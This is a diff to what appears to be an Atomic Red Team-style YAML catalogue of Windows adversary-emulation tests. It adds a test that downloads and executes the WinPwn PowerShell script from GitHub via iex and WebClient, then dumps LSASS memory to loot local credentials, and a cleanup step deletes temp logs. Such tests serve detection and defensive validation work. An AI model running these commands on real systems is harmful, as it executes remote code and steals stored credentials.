@@ -274,3 +274,15 @@ atomic_tests:
       rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
     cleanup_command: 
       del not_an_scr.scr
+- name: WinPwn - Loot local Credentials - dump lsass using rundll32 technique
+  description: Loot local Credentials - dump lsass using rundll32 technique  via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      dumplsass -consoleoutput -noninteractive
+    cleanup_command: |
+      Remove-Item -ErrorAction ignore C:\windows\temp\*.log
+    name: powershell
